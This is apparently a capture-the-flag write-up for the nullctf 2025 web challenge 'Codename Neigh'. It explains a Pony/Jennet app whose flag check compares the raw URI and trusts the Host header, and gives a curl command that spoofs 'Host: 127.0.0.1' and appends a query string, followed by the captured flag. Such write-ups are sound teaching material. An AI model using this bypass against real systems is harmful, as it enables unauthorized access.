# Codename Neigh - ??? pts

> **Category:** Web
> **Difficulty:** Easy
> **Solves:** ???
> **Status:** Solved

---

## Challenge Description

> *Pony-themed web application challenge*

**Attachments:** [codename_neigh.zip](files/codename_neigh.zip)
**Instance:** `http://public.ctf.r0devnull.team:3002/`

---

## Reconnaissance

- Pony language web application using Jennet framework
- Key routes in `main.pony`:
  - `/` → serves `index.html`
  - `/pony` → serves `pony.html`
  - `POST /pony/find` → form handler with template injection
  - `GET /flag` → flag handler (class `F`)
  - `GET /:name` → wildcard handler (class `H`)

---

## Analysis

### Key Observations

The flag handler `F` at `main.pony:33-60` has an access control check:

```pony
var conn: String = ""
try
  conn = ctx.request.header("Host") as String
end

let path: String = ctx.request.uri().string()

if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
  // serve flag.html
end
```

Two conditions must be met:
1. `Host` header equals `127.0.0.1`
2. Path is NOT `/flag` or `flag`

### Vulnerability / Weakness

**URI vs Path confusion** — The route matcher `/flag` correctly matches requests regardless of query string, but the security check uses `ctx.request.uri().string()` which returns the **full URI including query string**.

- Route `/flag` matches: `/flag`, `/flag?x`, `/flag?a=b`
- But `uri().string()` returns: `/flag`, `/flag?x`, `/flag?a=b` respectively

The string comparison `path != "/flag"` is strict equality, so:
- `/flag` → `"/flag" != "/flag"` → **false** (blocked)
- `/flag?x` → `"/flag?x" != "/flag"` → **true** (bypassed)

---

## Solution

### Approach

1. Add query string to `/flag` endpoint to bypass path check
2. Spoof `Host` header to `127.0.0.1`

### Exploit

```bash
curl -H "Host: 127.0.0.1" "http://public.ctf.r0devnull.team:3002/flag?x"
```

### Execution

```bash
$ curl -H "Host: 127.0.0.1" "http://public.ctf.r0devnull.team:3002/flag?x"
<!DOCTYPE html>
<html lang="en">
<body>
    <p>No pony here but you did find the flag:</p>
    <br>
    <b>nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}</b>
</body>
</html>
```

---

## Flag

```
nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}
```

---

## Lessons Learned

- URI string includes query parameters; path component does not
- Security checks should use parsed path, not raw URI string
- Route matching and access control should use consistent parsing
- Host header is trivially spoofable — never trust it for access control

---

## Resources

- [Pony Language](https://www.ponylang.io/)
- [Jennet HTTP Framework](https://github.com/theodus/jennet)

---

## Files

| File | Description |
|------|-------------|
| [files/](files/) | Challenge source code |

---

*Tags: #nullctf2025 #web #pony #uri-confusion #host-header #access-control-bypass*
